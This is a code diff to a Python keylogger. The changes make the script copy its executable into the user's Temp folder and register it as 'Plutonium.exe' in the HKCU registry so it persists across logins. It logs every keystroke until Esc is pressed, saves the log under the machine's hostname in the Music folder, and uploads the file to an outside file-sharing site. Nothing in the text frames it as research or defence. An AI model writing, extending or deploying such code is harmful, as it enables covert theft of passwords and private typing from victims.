@@ -1,13 +1,24 @@
 import keyboard
 import os
-#test.register_hkcu(app_name="testREG", script_path=os.path.abspath(__file__))
+import register
+import sys
+import tempfile
+script_path=sys.executable
+script_path='"'+script_path+'"'
+script_path_2='C:\\Users\\'+os.popen("echo %USERNAME%").read().strip('\n')+'\\AppData\\Local\\Temp'
+copy= "copy "+script_path+script_path_2
+os.system("copy "+script_path+' "'+
+          script_path_2+'"')
+register.register_hkcu(app_name="testREG", script_path=script_path_2+"\\Plutonium.exe")
 recorded= keyboard.record(until = 'esc')
-with open('keylog.txt', 'w') as f:
+a=os.popen("hostname").read().strip('\n')
+a='C:\\Users\\'+os.popen("echo %USERNAME%").read().strip('\n')+'\\Music\\'+a+".txt"
+with open(a, 'w') as f:
     for event in recorded:
         if event.event_type==keyboard.KEY_DOWN:
             f.write(f'{event}\n')
 f.close()        
-        
+
 import requests
 
 url = "https://www.airforshare.com/apiv3/upload.php"
@@ -23,9 +34,7 @@ data = {
 }
 
 files = {
-    "file": ("keylog.txt", open("keylog.txt", "rb"), "text/plain")
+    "file": (a, open(a, "rb"), "text/plain")
 }
 
 response = requests.post(url, headers=headers, data=data, files=files)
-
-print(response.text)
